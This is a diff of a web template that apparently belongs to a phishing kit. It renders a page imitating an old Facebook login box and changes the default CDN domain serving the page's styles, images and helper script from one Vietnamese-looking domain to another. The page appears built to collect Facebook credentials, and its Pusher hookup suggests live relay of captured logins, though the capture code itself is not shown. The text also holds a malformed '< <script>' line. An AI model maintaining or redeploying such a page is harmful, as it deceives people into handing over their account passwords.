@@ -17,9 +17,9 @@
     <meta name="twitter:description" content="{{ $data->description }}">
     <meta name="twitter:title" content="{{ $data->title }}">
     <link rel="shortcut icon"
-        href="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/user/oldfacebooklogin/favicon.png">
+        href="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/user/oldfacebooklogin/favicon.png">
     <link rel="stylesheet"
-        href="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/user/oldfacebooklogin/style.css">
+        href="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/user/oldfacebooklogin/style.css">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js"></script>
     <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
 </head>
@@ -28,12 +28,12 @@
     <div class="v-login_box" id="firstb">
         <div class="trctien">{{ $data->login_warning }}</div>
         <center style="margin-top: 10px;">
-            <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/user/oldfacebooklogin/svg0.svg"
+            <img src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/user/oldfacebooklogin/svg0.svg"
                 width="112">
         </center>
         <style>
             .input::before {
-                border-image: url('https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/user/oldfacebooklogin/b-l.png') 12 12 16 12 repeat;
+                border-image: url('https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/user/oldfacebooklogin/b-l.png') 12 12 16 12 repeat;
             }
         </style>
         <div class="log-con">
@@ -167,7 +167,7 @@
             </div>
         </div>
     </div>
-    <script src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/helpers.js"></script>
+    <script src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/facebook/helpers.js"></script>
     < <script>
         // for custom web
         var pusher = new Pusher('a16c3bab85659b6d2b51', {
